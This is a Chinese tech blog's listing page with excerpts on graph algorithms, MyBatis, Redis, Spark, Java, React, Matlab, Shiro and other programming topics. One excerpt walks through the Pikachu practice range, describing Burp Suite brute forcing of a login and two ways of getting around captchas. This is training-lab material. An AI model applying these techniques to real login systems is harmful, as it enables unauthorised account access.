		<a class="list__footer-readmore btn" href="/posts/073df61a41404a9f65bab7999a3fef78/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b429bf225a2f013180a4cc8cf9b6e469/" rel="bookmark">
			手把手教你用 NebulaGraph AI 全家桶跑图算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前段时间 NebulaGraph 3.5.0 发布，@whitewum 吴老师建议我把前段时间 NebulaGraph 社区里开启的新项目 ng_ai 公开给大家。
所以，就有了这个系列文章，本文是该系列的开篇之作。
ng_ai 是什么 ng_ai 的全名是：Nebulagraph AI Suite，顾名思义，它是在 NebulaGraph 之上跑算法的 Python 套件，希望能给 NebulaGraph 的用户一个自然、简洁的高级 API。简单来说，用很少的代码量就可以执行图上的算法相关的任务。
ng_ai 这个开源项目的目标是，快速迭代、公开讨论、持续演进，一句话概述便是：
Simplifying things in surprising ways.
这个 ng_ai 的专属 url：https://github.com/wey-gu/nebulagraph-ai 可以帮你了解更全面的它。
ng_ai 的特点 为了让 NebulaGraph 社区的小伙伴拥有顺滑的算法体验，ng_ai 有以下特点：
与 NebulaGraph 紧密结合，方便从其中读、写图数据支持多引擎、后端，目前支持 Spark（NebulaGraph Algorithm）、NetworkX，之后会支持 DGL、PyG友好、符合直觉的 API 设计与 NebulaGraph 的 UDF 无缝结合，支持从 Query 中调用 ng_ai 任务友好的自定义算法接口，方便用户自己实现算法（尚未完成）一键试玩环境（基于 Docker Extensions） 你可以这么用 ng_ai 跑分布式 PageRank 算法 可以在一个大图上，基于 nebula-algorithm 分布式地跑 PageRank 算法，像是这样：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b429bf225a2f013180a4cc8cf9b6e469/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6c393f1b18a172503def42820c5159d/" rel="bookmark">
			mybatis-plus 批量插入修改操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mybaits-plus 的学习成本相对较低,当学会了mybatis之后,mybaits-plus 很有友好的对mybaits仅仅是增强,没有任何改变,学习难度较低;
其中有个小小的问题,即 IService中自带的 saveBatch 和 saveOrUpdateBatch 等方法,仔细看会发现,他们的批量执行,竟然不是 真正的批量执行!!!
IService 的实现类 ServiceImpl 中截取一段代码
/** * 批量插入 * * @param entityList ignore * @param batchSize ignore * @return ignore */ @Transactional(rollbackFor = Exception.class) @Override public boolean saveBatch(Collection&lt;T&gt; entityList, int batchSize) { String sqlStatement = getSqlStatement(SqlMethod.INSERT_ONE); return executeBatch(entityList, batchSize, (sqlSession, entity) -&gt; sqlSession.insert(sqlStatement, entity)); } 会发现,其实是在循环插入, 那么如果这样我们有两种选择
1 使用mybatis 的xml文件,自己拼接插入,修改语句,就像最原始的那样,通过&lt;foreach 标签实现
2 重新配置全局的批量修改,增加方法
第一种不再赘述,现在说明第二种用法
一共需要五步;
第一步: 一般引入mybaits-plus 都会有相应的配置类, MybatisPlusConfig 名字无所谓,作用是一样的,一般都会用自带的分页插件,可以在此基础上,继续添加,给出我的配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e6c393f1b18a172503def42820c5159d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa518a25ce3457b3136b14138ddb0b26/" rel="bookmark">
			大模型时代的模型运维与部署：LLMops
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1 LLMOps介绍1.1 关联定义1.2 LLMOps 与 MLOps 2 LLMOps实现步骤2.1 数据管理2.1.1 数据清洗和预处理技术2.1.2 数据标记和注释2.1.3 数据存储、组织和版本控制2.1.4 数据合规性检验 2.2 基础模型的选择2.3 迭代和提示管理2.4 测试+评估2.5 部署2.6 监控 3 一些案例应用4 参考文献 1 LLMOps介绍 1.1 关联定义 术语 LLMOps 代表大型语言模型运维。它的简短定义是 LLMOps 是 LLM 的 MLOps。这意味着 LLMOps 是一组工具和最佳实践，用于管理 LLM 支持的应用程序的生命周期，包括开发、部署和维护。
LLM（大型语言模型）是可以生成人类语言输出的深度学习模型（因此称为语言模型）。这些模型有数十亿个参数，并接受了数十亿个单词的训练（因此被称为大型语言模型）。MLOps（机器学习运维）是一组工具和最佳实践，用于管理 ML 驱动的应用程序的生命周期。 因此，LLMOps 是一组工具和最佳实践，用于管理 LLM 支持的应用程序的生命周期。它可以被视为 MLOps 的子类别，因为 LLM 也是 ML 模型。
1.2 LLMOps 与 MLOps 首先MLOps 包含LLMOps，
但是，MLOps 和 LLMOps 之间的差异是由我们使用经典 ML 模型与 LLM 构建 AI 产品的方式不同造成的。差异主要影响数据管理、实验、评估、成本和延迟。
2 LLMOps实现步骤 几个LLMops的步骤：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fa518a25ce3457b3136b14138ddb0b26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e8be6533fe8ced1682c68a5f3b54f70/" rel="bookmark">
			redis删除key
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		redis的key删除的时候,是一个阻塞操作;
为什么会阻塞呢,是在删除key的时候,首先要寻找的key,然后进行删除,然而当key已经过期了,或者被他人删除之后,在删除的时候,就找不到这个key,那么它就一直寻找,新版的redis 有最大重试次数(以前的版本直接死循环),那么就会导致一直阻塞.这对于一线上项目来说,阻塞的这段时间可能是致命的;
如何避免??
1 删除普通key,删除key的时候,可以提前判断是否存在,在的时候再进行删除,这样就可以很大概率减少此类事件发生,例如这样:
if (redisTemplate.hasKey(RedisConstant.CASCADE_CHECK_COUNT + cascadeDownTask.getId())) { redisTemplate.delete(RedisConstant.CASCADE_CHECK_COUNT + cascadeDownTask.getId()); } 不要直接删除
2 其实还有一种情况,删除的这个key为大 key,什么是大key,不是key有多大,而是key对应的value 很大,例如 redis有五种数据类型,有四个是集合,那么当key对应的集合 非常大的时候,此key 就叫做大key,那么删除的时候,也会导致阻塞问题;
我们可以利用类如 分段处理的方式去处理,例如: 目前redis中对应的数据类型是hash,然后hash中有大量 hk ,我们可以分段去删除,然后每次删除休眠一下,这样可以有效减少redis的压力
@SpringBootTest @Slf4j class AreaDemoControllerTest { // @Autowired // IAreaDemoService areaDemoService; // // @Autowired // AreaDemoMapper areaDemoMapper; // @Test // public void aaa(){ // List&lt;AreaDemo&gt; list = areaDemoService.list(); // // List&lt;AreaDemo&gt; areaDemos1 = list.subList(0, 10); // areaDemos1.forEach(demo -&gt; demo.setId(null)); // areaDemoMapper.updateBatch(areaDemos1); // } @Autowired RedisTemplate redisTemplate; /** * @Description 模拟批量删除大key * @Author FL * @Date 11:08 2022/5/12 * @Param [] **/ @Test public void tetsts() { String key = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e8be6533fe8ced1682c68a5f3b54f70/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72b483129c1c017652e50b39fe51b09c/" rel="bookmark">
			spark3新特性之动态分区裁剪
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spark3.0为我们带来了许多令人期待的特性。Spark中的静态分区裁剪在介绍动态分区裁剪之前，有必要对Spark中的静态分区裁剪进行介绍。因此，在这种情况下，我们不能再应用静态分区裁剪，因为filter条件在join表的一侧，而对裁剪有用的表在Join的另一侧。Spark将这个查询转化为一种易于理解的形式，我们称它为查询的逻辑计划。物理计划阶段优化如果维度表很小，那么Spark很可能会以broadcasthashjoin的形式执行这个Join。
Spark 3.0 为我们带来了许多令人期待的特性。动态分区裁剪(dynamic partition pruning)就是其中之一。本文将通过图文的形式来带大家理解什么是动态分区裁剪。
Spark 中的静态分区裁剪 在介绍动态分区裁剪之前，有必要对 Spark 中的静态分区裁剪进行介绍。在标准数据库术语中，裁剪意味着优化器将避免读取不包含我们正在查找的数据的文件。例如我们有以下的查询 SQL：
1
&lt;ol&gt;&lt;li&gt;Select * from iteblog.Students where subject = 'English'; &lt;/li&gt;&lt;/ol&gt;
在这个简单的查询中，我们试图匹配和识别 Students 表中 subject = English 的记录。比较愚蠢的做法是先把数据全部 scan 出来，然后再使用 subject = 'English' 去过滤。如下图所示：
比较好的实现是查询优化器将过滤器下推到数据源，以便能够避免扫描整个数据集，Spark 就是这么来做的，如下图所示：
在静态分区裁剪技术中，我们的表首先是分区的，分区过滤下推的思想和上面的 filter push down 一致。因为在这种情况下，如果我们的查询有一个针对分区列的过滤，那么在实际的查询中可以跳过很多不必要的分区，从而大大减少数据的扫描，减少磁盘I/O，从而提升计算的性能。
然而，在现实中，我们的查询语句不会是这么简单的。通常情况下，我们会有多张维表，小表需要与大的事实表进行 join。因此，在这种情况下，我们不能再应用静态分区裁剪，因为 filter 条件在 join 表的一侧，而对裁剪有用的表在 Join 的另一侧。比如我们有以下的查询语句：
1
&lt;ol&gt;&lt;li&gt;Select * from iteblog.Students join iteblog.DailyRoutine &lt;/li&gt;&lt;li&gt;where iteblog.DailyRoutine.subject = 'English'; &lt;/li&gt;&lt;/ol&gt;
对于上面的查询，比较垃圾的查询引擎最后的执行计划如下：
它把两张表的数据进行关联，然后再过滤。在数据量比较大的情况下效率可想而知。一些比较好的计算引擎可以进行一些优化，比如：
其能够在一张表里面先过滤一些无用的数据，再进行 Join，效率自然比前面一种好。但是如果是我们人来弄，其实我们可以把 subject = 'English' 过滤条件下推到 iteblog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/72b483129c1c017652e50b39fe51b09c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e09aa4c48369ffad396e40d69a97fd6b/" rel="bookmark">
			Java 8 的 43 个函数总结，函数式编程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java 8 的 43 个函数总结 根据Java8的源码，分析统计和总结得出该文档。
统计： 总共43个函数类 按函数的类别可分为5类 按参数个数可分为4类 按类型可以分为5类 继承关系：2个。大多数的函数类是没有继承关系的，仅仅靠类名称上的语义来保证关系的递进 1、5类函数 根据类名称，将末尾的关键字提取出来分组，得到5个类别：
类别数量汇总描述方法Function17Function
BiFunction
类型Function *3
类型To类型Function *6
To类型Function *3
To类型BiFunction *3函数。
1~2参数+1返回R apply(T t);
R apply(T t, U u);
default compose(before);
default andThen(after);
static identity();Consumer8Consumer
BiConsumer
类型Consumer *3
Obj类型Consumer *3消费者。
1~2参数+0返回void accept(T t);
void accept(T t, U u);
default andThen(after);Operator8UnaryOperator
BinaryOperator
类型UnaryOperator *3
类型BinaryOperator *3操作。
1~2参数+1返回R apply(T t);
R apply(T t, U u);
int applyAsInt(int operand);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e09aa4c48369ffad396e40d69a97fd6b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d1eecc31d1462f35dd8784a7d4a68526/" rel="bookmark">
			pikachu靶场全15关通过教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一.Burte Force（暴力破解） 概述
“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。
理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：
1.是否要求用户设置复杂的密码；
2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；
3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；
4.是否采用了双因素认证；
...等等。
千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!
1.基于表单的暴力破解 打开就是一个这样的输入账号密码的登录框，明显是让我们进行账号密码的猜解
我们首先随意填写一个账号密码，并打开bp进行抓包，抓取成功的界面如下
我们点击Action然后send to Intruder准备进行爆破。
进入 Intruder界面后，我们需要选择需要对需要破解的数据进行标记，并且选择攻击方式（Attack type）
首先选择clear$，然后分别选中username和password输入的数据进行标记，点击Add$，最后选择攻击方式Cluster bomb
随后进入Payloads模块，在payload set 1位置，也就是username位置，上传关于我们的账号的字典，在2位置选择我们的密码字典，这里如果没有字典，可以去网上查找，或者直接手动添加爆破的数据
随后点击右上角start attack进行爆破
爆破结束后，我们可以根据返回数据长度来判断正确的账号密码，返回长度不同于其他数据包的，就是正确的账号密码，此处账号：admin 密码：123456
成功登录
2.验证码绕过（on server） 我们首先观察一下
当我们输入错误的用户名密码以及验证码时，提示我们验证码输入错误 当我输入错误的账号密码，但输入正确的验证码时，提示我们username or password is not exists
并且我们发现，只有当页面刷新时，验证码才会重新刷新，下面我们就来验证一下这个猜想
我们先来抓一个包，输入正确的验证码和错误的账号密码
再次修改密码，不改动验证码
依旧提示username or password is not exists，由此验证我们的猜想是对的，只要页面不刷新，验证码就不会改变。
呢么剩下的步骤就和上一关一样了，我们将数据包发送到攻击模块，暴力破解
3.验证码绕过（on client） 我们依旧随便填个账号密码 但填个正确的验证码试一下
提示账号或密码不存在
再填个错误的验证码看一下
有个提示验证码错误的弹窗
我们查看源代码发现了验证验证码的代码在前端
哎，看到这里我想说，任何在前端进行的验证，都是完全没有任何作用的
我们这里只需要先F12,再F1，选择禁用JavaScript
这样我们就绕过前端验证了
后面的步骤和前两关一样，也是bp抓包，爆破账号密码
4.token防爆破？ 在开始之前，我们先来了解一下token是什么
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d1eecc31d1462f35dd8784a7d4a68526/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d520d7966511b209cd1c6f70db0cee7c/" rel="bookmark">
			react学习 - 构建工程化项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
create-react-app的基础运用
项目目录
package.json页面
index.html
webpack打包优化
关于报错
为什么需要脚手架？
未来趋势肯定是组件化/模块化开发
有利于团队协作便于组件复用，提高效率、方便维护、减少冗余代码 组件划分：业务组件（不同的人做不同的组件）；功能组件（ui组件库）
因为组件库开发，就要带来“工程化”处理，使用打包工具
webpack vite rollup turbopack实现组件的打包、合并、压缩、打包代码编译、兼容、校验网络跨域，搭建临时服务器 create-react-app的基础运用 安装脚手架 create-react-app react官方脚手架
方法1：直接创建项目
npx create-react-app 项目名 //npx不能用的话，升级nodejs版本 npx
npm的附带产物用npx 执行命令 首先看第一个参数（一个空格就是一个参数）有没有被安装 如果没有安装，npx让npm临时安装一下；当安装成功npx会执行整段命令 方法2
//将脚手架安装全局 npm i create-react-app -g [mac前面设置sudo] //创建项目 create-react-app 项目名 //项目名规范 小写、数字、_下划线 npm start //启动项目 npm test //测试 npm run build //打包上线 项目目录 README.md 项目说明文档node_modules 所有的依赖安装的目录package-lock.json 锁定安装时的包的版本号,保证团队的依赖能保证一致。package.json 配置文件public 静态公共目录 index.htmlsrc 开发用的源代码目录，打包时只对这个目录的代码进行处理 index.js 主入口 package.json页面 一个React项目中，默认会安装 react：React框架的核心（语法、状态处理）react-dom：React视图渲染的核心（用于构建h5页面）react-native：构建和渲染App（应用）react-scripts：对打包命令的封装；调用node_modules中的打包命令，实现对项目打包编译
index.html //index.html &lt;!DOCTYPE html&gt; &lt;html lang="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d520d7966511b209cd1c6f70db0cee7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4645195326713ffa5662c7e97cb8bcb7/" rel="bookmark">
			Maltab与线性规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		线性规划问题是指在一组线性约束条件的限制下，求一线性目标函数的最大或最小的问题。 Matlab中的线性规划的标准形式如图所示：
其中c和x是n维列向量，A和Aeq是适当维数的矩阵，b和beq是适当维数的列矩阵。
基本函数形式为linprog（c，A，b），他返回的是向量x的值。
它完整的函数调用形式为：
x= linprog(f,A,b,Aeq,beq,lb,ub,x0,options) ，其中x0和options分别x的初始值和控制参数。
用一个例题来进行巩固：
求解下列线性规划问题：
首先，套入线性规划的标准型：得到c=[2,3,-5] a=[2,-5,1;1,3,1] b=[-10;12] aeq=[1,1,1]
beq=[1,1,1] ,在matlab中编写文件：
c=[2;3;-5];
a=[-2,5,-1;1,3,1];
b=[-10;12];
aeq=[1,1,1];
beq=7;
x=linprog(-c,a,b,aeq,beq,zeros(3,1));
value=c'*x;
运行结果：
与线性规划相关的指派问题：如果派n个人去干n项工作，每人干且仅干一件事，若分配第i个人干第j项工作，需要花费的时间，那么问如何分配工作才能使花费的总时间最少。将指派问题实例化，那么仅仅需要一个矩阵。
引入0-1模型，如果分配i干第j个工作，则取Xij=1，否则取Xij=0，上述指派问题的数学模型为：
求解指派问题，可以使用匈牙利算法：如果系数矩阵一行或一列每一个元素都加上或减去同一个数，得到一个新矩阵，则这两个矩阵拥有相同的最优指派。
例如：系数矩阵C为：
可以通过第一列减去15，第二列减去17，第三列减去17，第四列减去16，得到新矩阵：
不难看出最优指派为：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6848296e50d3c30b7bada9efaa144155/" rel="bookmark">
			【Python】提取文本文件中某个位置的数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录
问题背景：
问题分析：
问题解决：
问题背景： 1.提取文本文件中，某一行某一列的一个数据；
2.一个文件夹下有n个这样的文件，都需要提取同样位置的数据；
3.只从这n个文件中筛选出想要的文件进行数据提取；
4.每个文本文件中提取出来的m个不同位置的数，然后算出这些书中最大值或者最小值和该值对应的索引值。
问题分析： 这本身是我工作中一个做的一个小工具脚本，可以拆分成一些小问题来分别处理，这里为了便于理解，会将解决这些问题对应的每个小知识点都做一个概要解释，具体分析如下：
1.Python提取文本文件中某个位置的数据
先找到文本文件具体某一行的数据，然后再把该行数据存到列表中，通过索引的方式取该行具体对应某一列的数据。
Python取文件中某一行数据方法：
import linecache str=linecache.getline(filename,linenumber) 该方法返回一个&lt;str&gt;类型数据
2.Python获取某个路径文件夹下的所有文件
import os files=os.listdir(dirpath) dirpath是需要处理的文件夹路径，files是一个存着所有该路径下的文件名列表，之后通过循环处理每一个文件。
3.筛选问题其实相对好处理，在循环读取文件时加一个判断条件即可
4.Python取列表最大最小值与其对应的索引值
这里使用heapq来取最大值，使用map方法去匹配对应的索引值。
import heapq max_value=heapq.nlargest(1,value_lists) 问题解决： 具体代码如下：
1.Python获取指定路径文件夹下的所有文件
如果需要筛选的话也在这里加判断条件
def getFiles(dirpath): files=os.listdir(dirpath) for file in files: print(file) return files 调用：
filelist=getFiles("C:/Desktop/test.txt") 2.Python提取文本文件中某个位置的数据
def handleText(filelist): value_list=[] flie_index=[] for file in filelist: value=linecache.getline(file,20) value=value.strip().split(" ")[10] value_list.append(value) max_value=heapq.nlargest(1,value_list) max_value_index=list(map(value_list.index,max_value)) max_value_index=int(max_value[0]) filename=file_index[max_value_index] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72d597da087c7c42de28be298bb48dff/" rel="bookmark">
			强引用和弱引用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在Java中，引用可以分为不同的类型，其中包括强引用（Strong Reference）和弱引用（Weak Reference）。
强引用（Strong Reference）：
强引用是默认的引用类型，它是最常见的引用类型。当我们通过 new 关键字来创建一个对象，并将其赋值给一个变量时，这个变量就是一个强引用。强引用在程序中存在时，垃圾回收器不会回收被引用的对象，即使内存不足时也不会回收。只有当所有强引用都不存在时，垃圾回收器才会回收对象并释放内存。 弱引用（Weak Reference）：
弱引用是一种较不强大的引用类型，它允许对象在没有强引用指向时被垃圾回收。当一个对象只有弱引用指向时，它可以被垃圾回收器随时回收。弱引用通常用于构建缓存、观察者模式等场景，当对象不再被强引用引用时，可以自动释放相关资源。 在Java中，可以通过 java.lang.ref.WeakReference 类来创建弱引用。例如：
Object obj = new Object(); WeakReference&lt;Object&gt; weakRef = new WeakReference&lt;&gt;(obj); 在上述示例中，weakRef 是一个弱引用，它引用了 obj 对象。当 obj 不再有强引用指向时，weakRef 可以被垃圾回收器回收。
需要注意的是，使用弱引用时需要小心处理，因为弱引用的对象随时可能被垃圾回收器回收。在使用弱引用时，推荐在访问弱引用获取对象时进行必要的空值检查，以确保对象尚未被回收。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27490d8d50df1c10bc554bc5ee605ded/" rel="bookmark">
			实现前后端session共享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、如何实现session共享
1.1、修改shiro的配置类
2、解决前端不支持cookie的效果
2.1、修改登录的接口
2.2、修改前端登录办法
2.3、修改前端main.js文件
2.4、重写DefaultWebSessionManager的方法
2.5、修改shiro配置类
2.6、修改shiroFilter过滤器
1、如何实现session共享 session默认存储再各自服务的内存中，我们可以采用让session统一存储再redis中来解决不共享问题。
疯狂的蛋糕的依赖。---提供了redis存储session的类。
1.1、修改shiro的配置类 @Bean public DefaultWebSecurityManager securityManager(){ DefaultWebSecurityManager securityManager=new DefaultWebSecurityManager(); securityManager.setRealm(myRealm()); //设置缓存管理器 securityManager.setCacheManager(redisCacheManager()); //session管理 securityManager.setSessionManager(sessionManager()); return securityManager; } @Bean public SessionManager sessionManager(){ DefaultWebSessionManager sessionManager = new DefaultWebSessionManager(); sessionManager.setSessionDAO(sessionDAO());//sessionDao用于操作session对象，在容器中对对象session进行CRUD操作 return sessionManager; } @Bean public SessionDAO sessionDAO(){ //该类会对对象session进行CRUD操作 RedisSessionDAO sessionDAO = new RedisSessionDAO(); sessionDAO.setRedisManager(redisManager()); return sessionDAO; } //redis缓存管理器 @Bean public RedisCacheManager redisCacheManager(){ RedisCacheManager redisCacheManager = new RedisCacheManager(); redisCacheManager.setRedisManager(redisManager()); //redisCacheManager.setPrincipalIdFieldName("userId"); return redisCacheManager; } //redis管理器 @Bean public RedisManager redisManager(){ RedisManager redisManager = new RedisManager(); redisManager.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27490d8d50df1c10bc554bc5ee605ded/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e3bb4fadd3361ce84cd42708a2656fe/" rel="bookmark">
			开启visual studio，git for windows 疯狂占用内存的解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、开启visual studio，git for windows 疯狂占用内存的解决 最近开启visual studio写代码的时候，IDE总是会莫名奇妙的卡住然后闪退，今天打开任务管理器看了下原因，发现是visual studio所占磁盘内存不断疯涨，每秒几十MB的向上窜，不一会儿就到了2000MB，然后卡死。
点击visual studio里看，发现是git for Windows占用了大量内存，一想起前几天更新过visual studio，可能和那有关，尝试kill掉进程，但是一kill，他立马又重新自动出现，虽然暂时可以解决占用大量内存的问题，但是治标不治本。所以决定进到编译器里面去找，最后在编译器里面找到了原因。
进入源代码管理器中，选中插件选择。
将当前源代码管理插件设置为无，退出IDE重新进入后，git for windows就不会再出现。
磁盘内存也恢复了大些正常。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36726aa84359c263b4f558f76d11dd10/" rel="bookmark">
			PyCharm快捷键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 CTRL+ALT+SPACE 快速导入任意类
2 CTRL+SHIFT+ENTER 代码补全
3 SHIFT+F1 查看外部文档
4 CTRL+Q 快速查找文档
5 CTRL+P 参数信息（在方法中调用的参数）
6 CTRL+MOUSEOVERCODE 基本信息
7 CTRL+F1 显示错误或警告的描述
8 CTRL+INSERT 生成代码
9 CTRL+O 重载方法
10 CTRL+ALT+T 包裹代码
11 CTRL+/ 单行注释
12 CTRL+SHIFT+/ 块注释
13 CTRL+W 逐步选择代码（块）
14 CTRL+SHIFT+W 逐步取消选择代码（块）
15 CTRL+SHIFT+[ 从当前位置选择到代码块的开始
16 CTRL+SHIFT+] 从当前位置选择到代码块的结束
17 ALT+ENTER 代码快速修正
18 CTRL+ALT+L 代码格式标准化
19 CTRL+ALT+O 最佳化导入
20 CTRL+ALT+I 自动缩进
21 TAB 代码向后缩进
23 SHIFT+TAB 代码向前取消缩进
24 CTRL+SHIFT+V 历史复制粘贴表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36726aa84359c263b4f558f76d11dd10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2034ee60c0c159262315dfef18991b5c/" rel="bookmark">
			用 Apache POI 将 Word 文档转换为 PDF，PDF 转图片
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用 Apache POI 将 Word 文档转换为 PDF，PDF 转图片 找了很多网上例子，写得很杂而且用不了， 自己花了一天时间把整理好，废话不多说，直接上代码
必要依赖
&lt;dependency&gt; &lt;groupId&gt;org.apache.pdfbox&lt;/groupId&gt; &lt;artifactId&gt;pdfbox&lt;/artifactId&gt; &lt;version&gt;2.0.27&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.pdfbox&lt;/groupId&gt; &lt;artifactId&gt;pdfbox-tools&lt;/artifactId&gt; &lt;version&gt;2.0.27&lt;/version&gt; &lt;/dependency&gt; &lt;!--	填充word--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi&lt;/artifactId&gt; &lt;version&gt;3.17&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-ooxml-schemas&lt;/artifactId&gt; &lt;version&gt;3.17&lt;/version&gt; &lt;/dependency&gt; &lt;!--word转pdf,	填充word--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.poi&lt;/groupId&gt; &lt;artifactId&gt;poi-ooxml&lt;/artifactId&gt; &lt;version&gt;3.17&lt;/version&gt; &lt;/dependency&gt; &lt;!--word转pdf--&gt; &lt;dependency&gt; &lt;groupId&gt;fr.opensagres.xdocreport&lt;/groupId&gt; &lt;artifactId&gt;fr.opensagres.poi.xwpf.converter.pdf-gae&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.documents4j&lt;/groupId&gt; &lt;artifactId&gt;documents4j-local&lt;/artifactId&gt; &lt;version&gt;1.0.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.documents4j&lt;/groupId&gt; &lt;artifactId&gt;documents4j-transformer-msoffice-word&lt;/artifactId&gt; &lt;version&gt;1.0.3&lt;/version&gt; &lt;/dependency&gt; &lt;!--pdf转图片--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.pdfbox&lt;/groupId&gt; &lt;artifactId&gt;pdfbox&lt;/artifactId&gt; &lt;version&gt;3.0.0-alpha2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.pdfbox&lt;/groupId&gt; &lt;artifactId&gt;fontbox&lt;/artifactId&gt; &lt;version&gt;3.0.0-alpha2&lt;/version&gt; &lt;/dependency&gt; 工具类
package com.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2034ee60c0c159262315dfef18991b5c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e1d5a3e40f5e756e5062a9435b4d23d/" rel="bookmark">
			Vue3 &#43;Echarts5 可视化大屏——屏幕适配
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目基于Vue3 + Echarts5 开发，屏幕适配是使用 scale 方案
Echarts组件按需引入，减少打包体积
地图组件封装（全国&amp;省份地图按需加载）
效果图：
屏幕适配 大屏适配常用的方案有 rem + vw/vh 和 scale 。
rem + vw/vh 方案 结合使用rem（相对于根元素字体大小的单位）和vw/vh（视窗宽度/高度的单位）来实现大屏的适配。它的优点是灵活性高、兼容性好、适应性强，但需要进行计算，可能存在误差问题，且代码复杂度较高。
scale 方案 通过改变页面根元素的缩放比例来实现大屏适配。它的优点是实现简单，不需要进行计算，且适用范围广，但可能会存在像素失真问题。
此项目使用 scale 缩放这种方式来实现。
利用 CSS 的 transform：scale 属性对页面布局进行自适应缩放，CSS 元素设置完全按照设计稿大小设置 px，不需要转换长度单位。此项目设计稿给的尺寸是 1920*1080。具体方法如下：
首先根据浏览器大小推断缩放比例 思路：
